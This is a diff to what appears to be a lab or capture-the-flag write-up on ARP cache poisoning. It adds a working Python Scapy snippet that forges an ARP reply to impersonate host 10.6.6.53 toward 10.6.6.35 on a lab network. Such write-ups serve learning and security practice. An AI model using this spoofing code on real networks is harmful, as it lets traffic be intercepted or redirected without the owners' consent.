@@ -435,7 +435,25 @@ https://medium.com/datadriveninvestor/arp-cache-poisoning-using-scapy-d6711ecbe1
 
 ![](screenshots/arp-script-working-vars.png)
 
+~~~
+        ether_resp = Ether(dst="4c:24:57:ab:ed:84", type=0x806, src="02:42:0a:06:00:03")
 
+        arp_response = ARP(pdst="10.6.6.35")
+        arp_response.op = 2
+        arp_response.plen = 4
+        arp_response.hwlen = 6
+        arp_response.ptype = 0x0800
+        arp_response.hwtype = 1
+
+        arp_response.hwsrc = "02:42:0a:06:00:03"
+        arp_response.psrc = "10.6.6.53"
+        arp_response.hwdst = "4c:24:57:ab:ed:84"
+        arp_response.pdst = "10.6.6.35"
+
+        response = ether_resp/arp_response
+
+        sendp(response, iface="eth0")
+~~~
 
 
 
